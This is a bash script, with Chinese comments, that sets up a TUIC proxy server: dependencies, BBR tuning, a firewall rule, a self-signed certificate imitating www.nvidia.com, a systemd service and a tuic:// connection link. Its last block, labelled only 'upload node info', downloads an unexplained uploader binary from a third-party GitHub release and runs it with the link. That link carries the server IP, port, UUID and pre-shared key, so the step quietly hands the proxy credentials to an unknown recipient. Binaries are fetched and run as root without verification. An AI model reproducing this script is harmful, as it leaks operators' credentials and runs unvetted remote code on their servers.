#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
SERVER_NAME="www.nvidia.com"
CONFIG_DIR="/etc/tuic"
UPLOAD_BIN="/opt/uploader-linux-amd64"

# 安装依赖
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl wget sudo unzip jq ufw qrencode

# 加速模块
modprobe sch_fq || true
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf

modprobe tcp_bbr || true
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sysctl -p

# 开放端口
ufw allow ${PORT}/udp
ufw --force enable

# 安装 TUIC 服务端
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -L https://github.com/EAimTY/tuic/releases/latest/download/tuic-server-linux-amd64 -o tuic
chmod +x tuic

# 创建证书（自签）
mkdir -p $CONFIG_DIR/tls
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout $CONFIG_DIR/tls/key.key \
  -out $CONFIG_DIR/tls/cert.crt \
  -subj "/CN=${SERVER_NAME}"

# 写入配置
mkdir -p $CONFIG_DIR
cat > $CONFIG_DIR/config.json <<EOF
{
  "server": "0.0.0.0",
  "server_port": ${PORT},
  "users": {
    "${UUID}": "${PSK}"
  },
  "certificate": "$CONFIG_DIR/tls/cert.crt",
  "private_key": "$CONFIG_DIR/tls/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "3s",
  "max_idle_time": "30s",
  "max_packet_size": 1450,
  "disable_sni": false,
  "fallback_for_invalid_sni": {
    "enabled": true,
    "address": "www.nvidia.com",
    "port": 443
  }
}
EOF

# 写入 systemd 服务
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC QUIC Secure Node
After=network.target

[Service]
ExecStart=/usr/local/bin/tuic -c $CONFIG_DIR/config.json
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable tuic
systemctl restart tuic

# 构建 TUIC 链接（tuic://）
IP=$(curl -s https://api.ipify.org)
ENCODED=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
TUIC_LINK="tuic://${ENCODED}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native#tuic_secure"

echo -e "\n✅ TUIC 节点部署完成：\n$TUIC_LINK\n"
echo "$TUIC_LINK" | qrencode -o - -t ANSIUTF8

# 上传节点信息
[ -f "$UPLOAD_BIN" ] || {
  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

JSON="{\"tuic_link\":\"${TUIC_LINK}\"}"
"$UPLOAD_BIN" "$JSON"
